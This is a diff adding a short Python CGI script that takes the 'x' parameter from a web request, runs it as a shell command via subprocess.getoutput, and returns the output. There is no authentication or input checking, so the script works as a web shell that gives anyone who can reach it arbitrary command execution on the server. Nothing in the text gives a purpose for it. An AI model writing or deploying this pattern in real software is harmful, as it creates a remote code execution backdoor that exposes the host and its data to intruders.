@@ -1,0 +1,15 @@
+#!/usr/bin/python3
+
+print("content-type: text/html \n")
+
+
+
+import subprocess
+import cgi
+import webbrowser
+import os
+
+form=cgi.FieldStorage()
+cmd=form.getvalue("x")
+op=subprocess.getoutput(cmd)
+print(op)
